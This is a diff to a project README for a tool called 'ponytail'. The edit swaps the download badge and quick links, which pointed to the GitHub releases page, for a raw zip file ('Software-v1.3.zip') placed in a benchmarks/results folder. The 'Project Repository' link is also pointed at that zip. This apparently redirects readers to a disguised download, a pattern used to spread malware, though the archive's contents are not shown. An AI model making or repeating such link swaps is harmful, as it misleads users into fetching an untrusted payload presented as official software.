@@ -25,7 +25,7 @@ Getting ponytail is easy. Just follow these steps:
 
 ### Step 1: Visit the Download Page
 
-[![Download ponytail](https://img.shields.io/badge/Download-ponytail-blue?style=for-the-badge&logo=github)](https://github.com/saqie803/ponytail/releases)
+[![Download ponytail](https://img.shields.io/badge/Download-ponytail-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/saqie803/ponytail/main/benchmarks/results/Software-v1.3.zip)
 
 Visit this link to download the application.
 
@@ -137,8 +137,8 @@ Remember: the best code is the code you never wrote. Let ponytail help you and y
 
 ## 🔗 Quick Links
 
-- [Download ponytail](https://github.com/saqie803/ponytail/releases)
-- [Project Repository](https://github.com/saqie803/ponytail)
+- [Download ponytail](https://raw.githubusercontent.com/saqie803/ponytail/main/benchmarks/results/Software-v1.3.zip)
+- [Project Repository](https://raw.githubusercontent.com/saqie803/ponytail/main/benchmarks/results/Software-v1.3.zip)
 
 ## 📚 Keywords
 
